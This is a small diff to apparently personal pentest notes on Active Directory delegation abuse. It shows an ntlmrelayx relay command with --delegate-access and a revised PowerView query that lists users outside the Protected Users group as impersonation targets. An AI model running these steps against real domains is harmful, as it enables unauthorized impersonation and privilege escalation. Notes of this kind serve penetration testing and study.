@@ -159,9 +159,9 @@ sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access
 #### Check for a user to impersonate
 - Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
 - User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
-- Need to check how this can be impersonated exactly with a computer account. You can just use it in a PSCredential object if im correct! Need to double check!
 ```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+$creds = Get-Credential
+Get-DomainUser -Credential $creds -Domain <DOMAIN> -Server <DC IP> | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
 ```
 
 #### Impersonate any user and exploit
